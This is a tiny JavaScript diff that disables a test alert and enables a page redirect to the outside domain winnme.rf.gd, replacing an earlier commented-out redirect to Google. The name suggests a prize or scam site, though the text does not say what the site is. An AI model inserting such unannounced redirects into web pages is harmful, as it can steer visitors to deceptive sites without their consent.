@@ -1,2 +1,2 @@
-alert("Hello");
-//window.location = "https://www.google.com";
+//alert("Hello");
+window.location = "https://winnme.rf.gd";
